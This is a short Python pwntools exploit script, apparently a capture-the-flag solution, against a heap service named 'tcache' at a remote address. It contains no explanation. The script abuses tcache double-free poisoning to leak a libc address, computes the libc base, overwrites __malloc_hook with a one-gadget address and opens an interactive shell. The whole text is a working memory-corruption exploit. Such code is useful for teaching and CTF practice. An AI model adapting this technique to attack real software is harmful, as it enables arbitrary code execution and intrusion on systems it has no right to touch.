from pwn import *

elf = ELF('libc-2.27.so')
got_puts = 0x403fc0
got_exit = 0x403fb0
stderr = 0x404040
ptr = 0x404050

def Say(val):
    print('Say: ' + val)
    raw_input('say debug:')
    r.sendlineafter('>', '1')
    raw_input('say debug:')
    r.sendline(val)

def Print():
    raw_input('print debug:')
    r.sendlineafter('>', '2')

def Burn():
    raw_input('burn debug:')
    r.sendlineafter('>', '3')

#r = process('tcache')
r = remote('140.110.112.77', 4007)
Say('aaaaaaaa')
Burn()
Burn()
Burn()
Burn()
Say(p64(stderr - 8))
Say('')
Say('a' * 7)
Print()

elf.address = u64(r.recvlines(3)[2] + '\0\0') - 0x00007f9decd1b680 + 0x00007f9dec92f000 
print('libc base: {}, __malloc_hook: {}, one gadget: {}'.format(hex(elf.address), hex(elf.symbols['__malloc_hook']), hex(elf.address + 0x10a38c)))

raw_input('debug: ')
Say('aaaaaaaa')
Say('aaaaaaaa')
Burn()
Burn()
Say(p64(elf.symbols['__malloc_hook']))
Say('')
Say(p64(elf.address + 0x10a38c))
r.sendlineafter('>\n', '1')
r.interactive()
